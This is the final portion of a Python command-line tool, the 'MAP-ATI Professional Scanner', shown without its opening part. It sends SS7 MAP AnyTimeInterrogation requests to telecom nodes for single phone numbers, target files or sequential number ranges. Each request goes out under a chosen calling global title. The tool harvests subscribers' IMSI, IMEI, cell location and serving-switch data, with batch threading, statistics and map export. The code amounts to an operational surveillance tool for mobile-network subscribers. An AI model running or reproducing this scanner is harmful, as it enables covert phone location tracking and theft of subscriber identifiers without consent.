            stats['protocol_analysis_stats']['tcap_analysis_success'] += 1
        
        # Data extraction stats
        if result.subscriber_info.imsi:
            stats['data_extraction_stats']['imsi_extracted'] += 1
        
        if result.subscriber_info.imei:
            stats['data_extraction_stats']['imei_extracted'] += 1
        
        if result.location_info.mcc:
            stats['data_extraction_stats']['locations_found'] += 1
        
        if result.location_info.vlr_number:
            stats['data_extraction_stats']['vlr_numbers_found'] += 1
        
        if result.location_info.msc_number:
            stats['data_extraction_stats']['msc_numbers_found'] += 1
        
        # Operator statistics
        if result.location_info.operator_name:
            operator = result.location_info.operator_name
            if operator not in stats['operator_statistics']:
                stats['operator_statistics'][operator] = {
                    'count': 0,
                    'countries': set(),
                    'technologies': set(),
                    'mcc_mnc': f"{result.location_info.mcc}-{result.location_info.mnc}"
                }
            
            stats['operator_statistics'][operator]['count'] += 1
            if result.location_info.country:
                stats['operator_statistics'][operator]['countries'].add(result.location_info.country)
            if result.location_info.technology:
                stats['operator_statistics'][operator]['technologies'].update(result.location_info.technology)
        
        # Country statistics
        if result.location_info.country:
            country = result.location_info.country
            stats['country_statistics'][country] = stats['country_statistics'].get(country, 0) + 1
    
    # Response time analysis
    if response_times:
        stats['response_time_analysis'] = {
            'min_ms': min(response_times),
            'max_ms': max(response_times),
            'avg_ms': sum(response_times) / len(response_times),
            'median_ms': sorted(response_times)[len(response_times)//2],
            'samples': len(response_times)
        }
    
    # Convert sets to lists for JSON serialization
    for operator_data in stats['operator_statistics'].values():
        operator_data['countries'] = list(operator_data['countries'])
        operator_data['technologies'] = list(operator_data['technologies'])
    
    # Save statistics
    stats_file = output_dir / "comprehensive_statistics.json"
    with open(stats_file, 'w', encoding='utf-8') as f:
        json.dump(stats, f, indent=2, default=str, ensure_ascii=False)
    
    logger.info("Comprehensive statistics generated")

# ================================
# BATCH SCANNING WITH PROFESSIONAL UI
# ================================

def run_professional_batch_scan(targets: List[TargetInfo], ati_variant: AtiVariant = AtiVariant.BASIC,
                               cgpa_gt: str = "212600000001", max_workers: int = 10, 
                               timeout: int = 10) -> List[EnhancedScanResult]:
    """Professional batch scanning with real-time dashboard"""
    
    results = []
    total_targets = len(targets)
    
    if total_targets == 0:
        logger.warning("No targets to scan")
        return results
    
    # Initialize professional dashboard
    dashboard = ProfessionalDashboard()
    dashboard.scan_stats['total'] = total_targets
    
    # Output directory setup
    output_dir = create_professional_output_structure(SCAN_ID)
    
    if RICH_AVAILABLE:
        console = Console()
        console.print(f"\n🚀 [bold yellow]Starting Professional Batch Scan[/bold yellow]")
        console.print(f"📊 [cyan]Targets: {total_targets}, Workers: {max_workers}, Timeout: {timeout}s[/cyan]")
        console.print(f"🔧 [cyan]ATI Variant: {ati_variant.value}, CGPA: {cgpa_gt}[/cyan]")
        console.print(f"📁 [cyan]Output Directory: {output_dir}[/cyan]")
        console.print("─" * 90)
    else:
        print(f"\n🚀 Starting Professional Batch Scan")
        print(f"📊 Targets: {total_targets}, Workers: {max_workers}, Timeout: {timeout}s")
        print(f"🔧 ATI Variant: {ati_variant.value}, CGPA: {cgpa_gt}")
        print(f"📁 Output Directory: {output_dir}")
        print("─" * 90)
    
    start_time = time.time()
    
    # Auto-save thread for real-time backup
    def auto_save_worker():
        while len(results) < total_targets:
            time.sleep(30)  # Save every 30 seconds
            if results:
                try:
                    backup_file = output_dir / "auto_backup.json"
                    with open(backup_file, 'w', encoding='utf-8') as f:
                        json.dump([asdict(r) for r in results], f, indent=2, default=str)
                    logger.debug(f"Auto-backup saved: {len(results)} results")
                except Exception as e:
                    logger.error(f"Auto-backup failed: {e}")
    
    auto_save_thread = threading.Thread(target=auto_save_worker, daemon=True)
    auto_save_thread.start()
    
    # Live dashboard display
    if RICH_AVAILABLE and dashboard.console:
        with Live(dashboard.layout, refresh_per_second=2, screen=True) as live:
            dashboard.render()
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                # Submit all tasks
                future_to_target = {}
                for target in targets:
                    future = executor.submit(
                        send_ati_request_professional, 
                        target, ati_variant, cgpa_gt, timeout
                    )
                    future_to_target[future] = target
                
                # Collect results as they complete
                for future in as_completed(future_to_target):
                    target = future_to_target[future]
                    
                    try:
                        result = future.result()
                        results.append(result)
                        
                        # Update dashboard
                        dashboard.update_stats(result)
                        dashboard.render()
                        
                        # Real-time status update
                        progress = (len(results) / total_targets) * 100
                        elapsed = time.time() - start_time
                        
                        # Log important discoveries
                        if result.result == ScanResult.SUCCESS:
                            discoveries = []
                            if result.subscriber_info.imsi:
                                discoveries.append(f"IMSI: {result.subscriber_info.imsi}")
                            if result.location_info.operator_name:
                                discoveries.append(f"Op: {result.location_info.operator_name}")
                            if result.location_info.country:
                                discoveries.append(f"Country: {result.location_info.country}")
                            
                            discovery_text = ", ".join(discoveries) if discoveries else "Basic success"
                            logger.info(f"[{result.unique_id}] ✅ SUCCESS: {discovery_text}")
                        else:
                            logger.warning(f"[{result.unique_id}] ❌ {result.result.value}: {result.error_message}")
                        
                    except Exception as e:
                        logger.error(f"Error processing {target}: {e}")
                        
                        # Create error result
                        error_result = EnhancedScanResult(
                            target=target,
                            result=ScanResult.UNKNOWN_ERROR,
                            timestamp=datetime.now(timezone.utc).isoformat(),
                            scan_id=SCAN_ID,
                            unique_id=f"error_{int(time.time())}",
                            error_message=str(e)
                        )
                        results.append(error_result)
                        dashboard.update_stats(error_result)
                        dashboard.render()
    else:
        # Fallback non-Rich execution
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_target = {}
            for target in targets:
                future = executor.submit(
                    send_ati_request_professional, 
                    target, ati_variant, cgpa_gt, timeout
                )
                future_to_target[future] = target
            
            for future in as_completed(future_to_target):
                target = future_to_target[future]
                try:
                    result = future.result()
                    results.append(result)
                    
                    progress = (len(results) / total_targets) * 100
                    print(f"[{len(results):3d}/{total_targets}] {progress:5.1f}% - "
                          f"{target.ip}:{target.port} -> {result.result.value}")
                    
                except Exception as e:
                    logger.error(f"Error processing {target}: {e}")
    
    total_time = time.time() - start_time
    
    # Final summary
    if RICH_AVAILABLE:
        console.print("─" * 90)
        console.print(f"🏁 [bold green]Professional scan completed in {total_time:.1f} seconds[/bold green]")
        console.print(f"📈 [cyan]Scan rate: {len(targets)/total_time:.1f} targets/second[/cyan]")
    else:
        print("─" * 90)
        print(f"🏁 Professional scan completed in {total_time:.1f} seconds")
        print(f"📈 Scan rate: {len(targets)/total_time:.1f} targets/second")
    
    # Save comprehensive results
    try:
        save_results_comprehensive_professional(results, output_dir)
        
        if RICH_AVAILABLE:
            console.print(f"💾 [green]Complete results saved to: {output_dir}[/green]")
        else:
            print(f"💾 Complete results saved to: {output_dir}")
            
    except Exception as e:
        logger.error(f"Failed to save results: {e}")
    
    return results

# ================================
# ENHANCED MAIN FUNCTION & CLI
# ================================

def create_professional_argument_parser() -> argparse.ArgumentParser:
    """Create professional command line interface"""
    
    parser = argparse.ArgumentParser(
        description=f"MAP-ATI Professional Scanner v{VERSION} - Advanced Cellular Network Analysis",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
🎯 PROFESSIONAL EXAMPLES:

  # Single target with comprehensive analysis
  python3 {sys.argv[0]} -t 192.168.1.100:2905:+1234567890 --ati-variant all_info

  # Batch professional scan with full data extraction
  python3 {sys.argv[0]} -f targets.csv -o professional_results --format comprehensive

  # Range scan with Google Maps integration
  python3 {sys.argv[0]} -r 192.168.1.100:2905:+1234567890:100 --enable-maps --workers 20

  # Advanced professional scan with all features
  python3 {sys.argv[0]} -f targets.json --ati-variant all_info --timeout 15 \\
    --workers 25 --enable-maps --create-reports --log-level DEBUG

📊 SUPPORTED INPUT FORMATS:
  • CSV: ip,port,msisdn,description
  • JSON: [{{"ip":"x.x.x.x","port":2905,"msisdn":"+123456","description":"target"}}]
  • TXT: ip:port:msisdn:description (one per line)

🎯 ATI VARIANTS:
  • basic: Location and subscriber state
  • location_only: Location information only
  • subscriber_state: Subscriber state only
  • equipment_info: Equipment status and IMEI
  • all_info: Complete information extraction
  • minimal: Minimal request

📁 OUTPUT FEATURES:
  • Professional directory structure
  • Google Maps KML/HTML export
  • Interactive HTML reports
  • Comprehensive CSV/JSON data
  • Real-time auto-backup

⚡ PROFESSIONAL FEATURES:
  • Complete TCAP/MAP analysis engine
  • Real-time Rich UI dashboard
  • Operator intelligence database
  • Location services integration
  • Multi-format export system

📧 Author: {AUTHOR}
🔢 Version: {VERSION}
📅 Build: {BUILD_DATE}
        """
    )
    
    # Target specification (mutually exclusive)
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('-t', '--target', 
                            help='Single target: IP:PORT:MSISDN')
    target_group.add_argument('-f', '--file', 
                            help='Load targets from file (CSV/JSON/TXT)')
    target_group.add_argument('-r', '--range', 
                            help='MSISDN range: IP:PORT:BASE_MSISDN:COUNT')
    
    # Professional ATI configuration
    parser.add_argument('--ati-variant', 
                       choices=[v.value for v in AtiVariant],
                       default=AtiVariant.BASIC.value,
                       help='ATI variant for data extraction (default: basic)')
    parser.add_argument('--cgpa-gt', 
                       default='212600000001',
                       help='Calling party GT/MSISDN (default: 212600000001)')
    
    # Range-specific options
    parser.add_argument('--step', type=int, default=1,
                       help='Step size for MSISDN range generation (default: 1)')
    
    # Professional scanning options
    parser.add_argument('--timeout', type=int, default=10,
                       help='Connection timeout in seconds (default: 10)')
    parser.add_argument('--workers', type=int, default=10,
                       help='Max concurrent workers (default: 10)')
    parser.add_argument('--delay', type=float, default=0.0,
                       help='Delay between requests in seconds (default: 0)')
    
    # Professional output options
    parser.add_argument('-o', '--output',
                       help='Output directory name (auto-generated if not specified)')
    parser.add_argument('--format', 
                       choices=['comprehensive', 'basic', 'csv', 'json'],
                       default='comprehensive',
                       help='Output format (default: comprehensive)')
    parser.add_argument('--enable-maps', action='store_true',
                       help='Enable Google Maps integration and export')
    parser.add_argument('--create-reports', action='store_true',
                       help='Generate comprehensive HTML reports')
    parser.add_argument('--include-raw', action='store_true',
                       help='Include raw protocol data in exports')
    
    # Professional logging options
    parser.add_argument('--log-level',
                       choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],
                       default='INFO',
                       help='Logging level (default: INFO)')
    parser.add_argument('--log-file',
                       help='Log file path (auto-generated if not specified)')
    
    # Advanced professional options
    parser.add_argument('--no-banner', action='store_true',
                       help='Suppress professional banner')
    parser.add_argument('--no-ui', action='store_true',
                       help='Disable Rich UI dashboard (use basic output)')
    parser.add_argument('--auto-save', type=int, default=30,
                       help='Auto-save interval in seconds (default: 30)')
    parser.add_argument('--max-targets', type=int, default=10000,
                       help='Maximum targets to process (default: 10000)')
    
    return parser

def validate_professional_arguments(args) -> bool:
    """Validate professional command line arguments"""
    
    # Validate workers count
    if args.workers < 1 or args.workers > 100:
        if RICH_AVAILABLE:
            console = Console()
            console.print("❌ [red]Workers count must be between 1 and 100[/red]")
        else:
            print("❌ Workers count must be between 1 and 100")
        return False
    
    # Validate timeout
    if args.timeout < 1 or args.timeout > 300:
        if RICH_AVAILABLE:
            console = Console()
            console.print("❌ [red]Timeout must be between 1 and 300 seconds[/red]")
        else:
            print("❌ Timeout must be between 1 and 300 seconds")
        return False
    
    # Validate CGPA GT
    try:
        format_msisdn_professional(args.cgpa_gt)
    except ValueError as e:
        if RICH_AVAILABLE:
            console = Console()
            console.print(f"❌ [red]Invalid CGPA GT: {e}[/red]")
        else:
            print(f"❌ Invalid CGPA GT: {e}")
        return False
    
    # Validate single target format
    if args.target:
        parts = args.target.split(':')
        if len(parts) < 3:
            if RICH_AVAILABLE:
                console = Console()
                console.print("❌ [red]Invalid target format. Use IP:PORT:MSISDN[/red]")
            else:
                print("❌ Invalid target format. Use IP:PORT:MSISDN")
            return False
        
        try:
            ipaddress.ip_address(parts[0])
            port = int(parts[1])
            if not (1 <= port <= 65535):
                raise ValueError("Invalid port range")
            format_msisdn_professional(parts[2])
        except (ValueError, ipaddress.AddressValueError) as e:
            if RICH_AVAILABLE:
                console = Console()
                console.print(f"❌ [red]Invalid target: {e}[/red]")
            else:
                print(f"❌ Invalid target: {e}")
            return False
    
    # Validate range format
    if args.range:
        parts = args.range.split(':')
        if len(parts) < 4:
            if RICH_AVAILABLE:
                console = Console()
                console.print("❌ [red]Invalid range format. Use IP:PORT:BASE_MSISDN:COUNT[/red]")
            else:
                print("❌ Invalid range format. Use IP:PORT:BASE_MSISDN:COUNT")
            return False
        
        try:
            ipaddress.ip_address(parts[0])
            port = int(parts[1])
            if not (1 <= port <= 65535):
                raise ValueError("Invalid port range")
            format_msisdn_professional(parts[2])
            count = int(parts[3])
            if count < 1 or count > args.max_targets:
                raise ValueError(f"Count must be between 1 and {args.max_targets}")
        except (ValueError, ipaddress.AddressValueError) as e:
            if RICH_AVAILABLE:
                console = Console()
                console.print(f"❌ [red]Invalid range: {e}[/red]")
            else:
                print(f"❌ Invalid range: {e}")
            return False
    
    # Validate file existence
    if args.file and not Path(args.file).exists():
        if RICH_AVAILABLE:
            console = Console()
            console.print(f"❌ [red]Target file not found: {args.file}[/red]")
        else:
            print(f"❌ Target file not found: {args.file}")
        return False
    
    return True

def load_targets_professional(file_path: str, max_targets: int = 10000) -> List[TargetInfo]:
    """Professional target loading with enhanced format support"""
    targets = []
    file_path = Path(file_path)
    
    if not file_path.exists():
        logger.error(f"Target file not found: {file_path}")
        return targets
    
    try:
        logger.info(f"Loading targets from {file_path}")
        
        # JSON format
        if file_path.suffix.lower() == '.json':
            with open(file_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
                for item in data:
                    if len(targets) >= max_targets:
                        break
                    targets.append(TargetInfo(
                        ip=str(item['ip']),
                        port=int(item.get('port', 2905)),
                        msisdn=str(item['msisdn']),
                        description=str(item.get('description', ''))
                    ))
        
        # CSV format
        elif file_path.suffix.lower() == '.csv':
            with open(file_path, 'r', encoding='utf-8') as f:
                reader = csv.DictReader(f)
                for row_num, row in enumerate(reader, 1):
                    if len(targets) >= max_targets:
                        break
                    try:
                        targets.append(TargetInfo(
                            ip=str(row['ip']).strip(),
                            port=int(row.get('port', 2905)),
                            msisdn=str(row['msisdn']).strip(),
                            description=str(row.get('description', f'CSV line {row_num}')).strip()
                        ))
                    except (KeyError, ValueError) as e:
                        logger.warning(f"Skipping invalid CSV row {row_num}: {e}")
        
        # Plain text format
        else:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line_num, line in enumerate(f, 1):
                    if len(targets) >= max_targets:
                        break
                    
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    # Try different separators
                    for sep in [':', ';', '\t', ',']:
                        parts = line.split(sep)
                        if len(parts) >= 3:
                            try:
                                targets.append(TargetInfo(
                                    ip=parts[0].strip(),
                                    port=int(parts[1].strip()),
                                    msisdn=parts[2].strip(),
                                    description=parts[3].strip() if len(parts) > 3 else f"Line {line_num}"
                                ))
                                break
                            except ValueError:
                                continue
        
        logger.info(f"Loaded {len(targets)} targets from {file_path}")
        return targets
        
    except Exception as e:
        logger.error(f"Error loading targets: {e}")
        return []

def generate_msisdn_range_professional(base_msisdn: str, count: int, step: int = 1) -> List[str]:
    """Professional MSISDN range generation"""
    msisdns = []
    
    try:
        # Extract numeric part
        base_digits = ''.join(c for c in base_msisdn if c.isdigit())
        base_num = int(base_digits)
        
        # Preserve prefix format
        prefix = base_msisdn[:len(base_msisdn) - len(base_digits)]
        
        for i in range(count):
            new_number = base_num + (i * step)
            msisdns.append(f"{prefix}{new_number}")
        
        logger.info(f"Generated {len(msisdns)} MSISDNs from {base_msisdn} with step {step}")
        
    except ValueError as e:
        logger.error(f"MSISDN range generation failed: {e}")
    
    return msisdns

def main():
    """Professional main function with comprehensive error handling"""
    
    parser = create_professional_argument_parser()
    args = parser.parse_args()
    
    # Display banner unless suppressed
    if not args.no_banner:
        print_professional_banner()
    
    # Setup professional logging
    global logger
    log_file = args.log_file
    if not log_file and args.log_level == 'DEBUG':
        log_file = f"logs/professional_scan_{SCAN_ID}.log"
    
    logger = setup_professional_logging(args.log_level, log_file)
    
    # Validate arguments
    if not validate_professional_arguments(args):
        sys.exit(1)
    
    # Final dependency verification
    if not PYCRATE_AVAILABLE or not SCTP_AVAILABLE:
        if RICH_AVAILABLE:
            console = Console()
            console.print("❌ [red]Critical dependencies missing[/red]")
        else:
            print("❌ Critical dependencies missing")
        sys.exit(1)
    
    # Parse ATI variant
    ati_variant = AtiVariant(args.ati_variant)
    
    # Load targets
    targets = []
    
    if args.target:
        # Single target
        parts = args.target.split(':')
        targets.append(TargetInfo(
            ip=parts[0],
            port=int(parts[1]),
            msisdn=parts[2],
            description="Single professional target"
        ))
    
    elif args.file:
        # Load from file
        targets = load_targets_professional(args.file, args.max_targets)
        if not targets:
            if RICH_AVAILABLE:
                console = Console()
                console.print("❌ [red]No valid targets loaded[/red]")
            else:
                print("❌ No valid targets loaded")
            sys.exit(1)
    
    elif args.range:
        # MSISDN range
        parts = args.range.split(':')
        ip, port, base_msisdn, count = parts[0], int(parts[1]), parts[2], int(parts[3])
        msisdns = generate_msisdn_range_professional(base_msisdn, min(count, args.max_targets), args.step)
        
        for msisdn in msisdns:
            targets.append(TargetInfo(
                ip=ip,
                port=port,
                msisdn=msisdn,
                description=f"Range scan #{len(targets)+1}"
            ))
    
    if not targets:
        if RICH_AVAILABLE:
            console = Console()
            console.print("❌ [red]No targets specified[/red]")
        else:
            print("❌ No targets specified")
        sys.exit(1)
    
    # Display professional scan configuration
    if RICH_AVAILABLE and not args.no_ui:
        console = Console()
        
        config_table = Table(title="🎯 Professional Scan Configuration", show_header=True, header_style="bold magenta")
        config_table.add_column("Parameter", style="cyan", no_wrap=True)
        config_table.add_column("Value", style="green")
        
        config_table.add_row("Targets", str(len(targets)))
        config_table.add_row("ATI Variant", ati_variant.value)
        config_table.add_row("CGPA GT", args.cgpa_gt)
        config_table.add_row("Timeout", f"{args.timeout}s")
        config_table.add_row("Workers", str(args.workers))
        config_table.add_row("Output Format", args.format)
        if args.enable_maps:
            config_table.add_row("Google Maps", "✅ Enabled")
        if args.create_reports:
            config_table.add_row("HTML Reports", "✅ Enabled")
        config_table.add_row("Scan ID", SCAN_ID)
        
        console.print(config_table)
        console.print()
    
    # Run professional scan
    logger.info(f"Starting professional MAP-ATI scan with {len(targets)} targets")
    
    try:
        results = run_professional_batch_scan(
            targets, ati_variant, args.cgpa_gt, 
            args.workers, args.timeout
        )
        
        # Final professional summary
        successful_count = sum(1 for r in results if r.result == ScanResult.SUCCESS)
        imsi_count = sum(1 for r in results if r.subscriber_info.imsi)
        location_count = sum(1 for r in results if r.location_info.mcc)
        
        if RICH_AVAILABLE:
            console = Console()
            
            summary_table = Table(title="🎉 Professional Scan Summary", show_header=True, header_style="bold green")
            summary_table.add_column("Metric", style="cyan")
            summary_table.add_column("Count", style="green")
            summary_table.add_column("Percentage", style="yellow")
            
            success_rate = (successful_count / len(results)) * 100 if results else 0
            summary_table.add_row("Total Scans", str(len(results)), "100.0%")
            summary_table.add_row("Successful", str(successful_count), f"{success_rate:.1f}%")
            summary_table.add_row("IMSI Extracted", str(imsi_count), f"{(imsi_count/len(results)*100):.1f}%")
            summary_table.add_row("Locations Found", str(location_count), f"{(location_count/len(results)*100):.1f}%")
            
            console.print(summary_table)
            
            if successful_count > 0:
                console.print(f"\n🎉 [bold green]Professional scan completed successfully![/bold green]")
                console.print(f"📊 [cyan]Data extraction rate: {(imsi_count/successful_count*100):.1f}%[/cyan]")
            else:
                console.print(f"\n⚠️ [yellow]Scan completed with no successful responses[/yellow]")
                
        else:
            print(f"\n🎉 Professional scan completed!")
            print(f"📊 Results: {successful_count}/{len(results)} successful ({(successful_count/len(results)*100):.1f}%)")
            print(f"📱 Data: {imsi_count} IMSI, {location_count} locations")
        
        exit_code = 0 if successful_count > 0 else 1
        
    except KeyboardInterrupt:
        if RICH_AVAILABLE:
            console = Console()
            console.print("\n🛑 [yellow]Professional scan interrupted by user[/yellow]")
        else:
            print("\n🛑 Professional scan interrupted by user")
        exit_code = 130
        
    except Exception as e:
        logger.error(f"Professional scan failed: {e}")
        if RICH_AVAILABLE:
            console = Console()
            console.print(f"\n❌ [red]Professional scan failed: {e}[/red]")
        else:
            print(f"\n❌ Professional scan failed: {e}")
        exit_code = 1
    
    # Final tip
    if not args.no_ui and RICH_AVAILABLE:
        console.print(f"\n💡 [dim]Tip: Check the results directory for comprehensive reports and exports[/dim]")
    
    sys.exit(exit_code)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        if RICH_AVAILABLE:
            console = Console()
            console.print("\n🛑 [yellow]Professional scanner terminated by user[/yellow]")
        else:
            print("\n🛑 Professional scanner terminated by user")
        sys.exit(130)
    except Exception as e:
        logger.error(f"Critical error: {e}")
        if RICH_AVAILABLE:
            console = Console()
            console.print(f"\n❌ [red]Critical error: {e}[/red]")
        else:
            print(f"\n❌ Critical error: {e}")
        if logger.level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        sys.exit(1)
